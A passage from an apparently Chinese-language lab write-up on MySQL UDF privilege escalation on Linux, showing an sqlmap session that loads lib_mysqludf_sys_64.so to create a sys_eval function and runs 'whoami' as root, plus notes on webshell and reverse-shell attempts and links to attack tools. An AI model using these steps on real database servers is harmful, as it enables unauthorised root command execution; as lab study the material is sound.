    ___ ___[,]_____ ___ ___  {1.4.2.24#dev}
   |_ -| . [)]     | .'| . |
   |___|_  [)]_|_|_|__,|  _|
         |_|V...       |_|   http://sqlmap.org
   
   [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
   
   [*] starting @ 13:32:23 /2020-02-10/
   
   [13:32:23] [INFO] connection to MySQL server '172.20.10.9:3306' established
   [13:32:23] [INFO] testing MySQL
   [13:32:23] [INFO] resumed: [['1']]...
   [13:32:23] [INFO] confirming MySQL
   [13:32:23] [INFO] resumed: [['1']]...
   [13:32:23] [INFO] the back-end DBMS is MySQL
   back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
   [13:32:23] [INFO] calling MySQL shell. To quit type 'x' or 'q' and press ENTER
   sql-shell> create function sys_eval returns string soname 'lib_mysqludf_sys_64.so'
   [13:34:56] [INFO] executing SQL data definition statement: 'create function sys_eval returns string soname 'lib_mysqludf_sys_64.so''
   create function sys_eval returns string soname 'lib_mysqludf_sys_64.so': 'NULL'
   sql-shell> select sys_eval('whoami');
   [13:35:59] [INFO] fetching SQL SELECT statement query output: 'select sys_eval('whoami')'
   select sys_eval('whoami') [1]:
   [*] root
   
   sql-shell>
   ```

   

   > sqlmap中的udf文件提供的函数：
   >
   > sys_eval，执行任意命令，并将输出返回。
   >
   > sys_exec，执行任意命令，并将退出码返回。
   >
   > sys_get，获取一个环境变量。
   >
   > sys_set，创建或修改一个环境变量。
   >
   > ...

### [2.3 利用HackMySQL](https://github.com/SEC-GO/Red-vs-Blue/blob/master/linux环境下的MySQL UDF提权.md#23-利用hackmysql)

以前叫Python_FuckMySQL，仅适用于目标系统为windows，故略。

https://github.com/T3st0r-Git/HackMySQL

https://github.com/v5est0r/Python_FuckMySQL

\##3. GetShell的情况

> 适用情况：已经通过一句话木马等GetShell，并且得到了数据库用户名、密码。

\###上传含udf提权功能的大马提权

手上的提权木马都是针对windows的，且都是php5。而实验环境是Kali+php7，故未实操。

文章可参考以下：

https://mp.weixin.qq.com/s/URPJPbmRixfWPKFDaX1qFA

http://zone.secevery.com/article/1096

\###反弹shell

思路：通过getshell反弹shell后，在反弹回来的shell中连接mysql，然后进行手工提权。

结果：失败，在反弹回来的shell中无法成功连接mysql。
